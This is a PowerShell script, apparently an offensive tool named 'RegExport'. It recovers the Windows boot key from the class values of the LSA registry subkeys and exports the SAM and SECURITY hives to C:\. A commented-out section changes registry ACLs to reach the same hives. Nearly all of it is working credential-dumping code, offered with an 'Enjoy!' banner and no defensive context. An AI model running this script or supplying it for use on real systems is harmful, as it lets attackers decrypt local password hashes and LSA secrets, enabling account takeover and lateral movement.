Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

public class RegistryHelper
{
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, int ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegQueryInfoKey(IntPtr hKey, StringBuilder lpClass, ref uint lpcClass, IntPtr lpReserved, IntPtr lpSubKeys, IntPtr lpMaxSubKeyLen, IntPtr lpMaxClassLen, IntPtr lpValues, IntPtr lpMaxValueNameLen, IntPtr lpMaxValueLen, IntPtr lpSecurityDescriptor, IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegCloseKey(IntPtr hKey);

    public static string GetRegistryClassValue(string subKey)
    {
        IntPtr hKey = IntPtr.Zero;
        uint lpcClass = 256;
        StringBuilder lpClass = new StringBuilder((int)lpcClass);

        int result = RegOpenKeyEx(Registry.LocalMachine.Handle.DangerousGetHandle(), subKey, 0, 0x20019, out hKey);
        if (result != 0)
        {
            throw new Exception("Error opening registry key: " + result);
        }

        result = RegQueryInfoKey(hKey, lpClass, ref lpcClass, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (result != 0)
        {
            throw new Exception("Error querying registry key class: " + result);
        }

        RegCloseKey(hKey);
        return lpClass.ToString();
    }
}
"@

function Get-BootKey {
    $keys = @("JD", "Skew1", "GBG", "Data")
    $basePath = "SYSTEM\CurrentControlSet\Control\Lsa\"
    $bootKey = [byte[]]::new(16)
    $offset = 0

    foreach ($key in $keys) {
        $fullPath = $basePath + $key
        $classValue = [RegistryHelper]::GetRegistryClassValue($fullPath)
        $byteArray = [byte[]]::new($classValue.Length / 2)
        for ($i = 0; $i -lt $classValue.Length / 2; $i++) {
            $byteArray[$i] = [Convert]::ToByte($classValue.Substring($i * 2, 2), 16)
        }
        [Array]::Copy($byteArray, 0, $bootKey, $offset, $byteArray.Length)
        $offset += $byteArray.Length
    }

    $transforms = @(8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7)
    $temp = [byte[]]::new(16)
    [Array]::Copy($bootKey, $temp, 16)
    for ($i = 0; $i -lt 16; $i++) {
        $bootKey[$i] = $temp[$transforms[$i]]
    }

    return $bootKey
}

function Export-RegistryKey {
    param (
        [string]$keyPath,
        [string]$outputPath
    )

    try {
        Write-Output "[+] Exporting $keyPath"
        reg export "HKLM\$keyPath" $outputPath
        Write-Output "[+] Successfully exported $keyPath to $outputPath"
    } catch {
        Write-Output "[-] Failed to export $keyPath : $_"
    }
}
$samKeyPath = "SAM"
$securityKeyPath = "SECURITY"
$ascii1 = @"
 ____            _____                       __  
|  _ \ ___  __ _| ____|_  ___ __   ___  _ __| |_ 
| |_) / _ \/ _` |  _| \ \/ / '_ \ / _ \| '__| __|
|  _ <  __/ (_| | |___ >  <| |_) | (_) | |  | |_ 
|_| \_\___|\__, |_____/_/\_\ .__/ \___/|_|   \__|
           |___/           |_|                   

"@
$ascii2 = @"

0oOo
||||)
||||     Enjoy!
'""'

"@

Write-Output $ascii1

$bootKey = Get-BootKey
$hexValues = $bootKey | ForEach-Object { $_.ToString("x2") }
$bootKeyString = $hexValues -join ""
Write-Output "[*] Boot key is: $bootKeyString"

Export-RegistryKey -keyPath $samKeyPath -outputPath "C:\SAM.reg"
Export-RegistryKey -keyPath $securityKeyPath -outputPath "C:\SECURITY.reg"



Write-Output $ascii2



<#
$samKeyPath = "SAM"
$securityKeyPath = "SECURITY"

function Grant-RegistryPermissions {
    param (
        [string]$registryPath
    )

    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryPath, 'ReadWriteSubTree', 'ChangePermissions')
    $ACL = $SubKey.GetAccessControl()
    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $ACL.SetAccessRule($Rule)
    $SubKey.SetAccessControl($ACL)
    $SubKey.Close()
}

function Revoke-RegistryPermissions {
    param (
        [string]$registryPath
    )

    $SubKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryPath, 'ReadWriteSubTree', 'ChangePermissions')
    $ACL = $SubKey.GetAccessControl()
    $Rule = New-Object System.Security.AccessControl.RegistryAccessRule ([Security.Principal.WindowsIdentity]::GetCurrent().Name, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
    $ACL.RemoveAccessRule($Rule)
    $SubKey.SetAccessControl($ACL)
    $SubKey.Close()
}

Grant-RegistryPermissions -registryPath $samKeyPath
Grant-RegistryPermissions -registryPath $securityKeyPath

reg export HKLM\SAM C:\SAM.reg
reg export HKLM\SECURITY C:\SECURITY.reg

Revoke-RegistryPermissions -registryPath $samKeyPath
Revoke-RegistryPermissions -registryPath $securityKeyPath

#>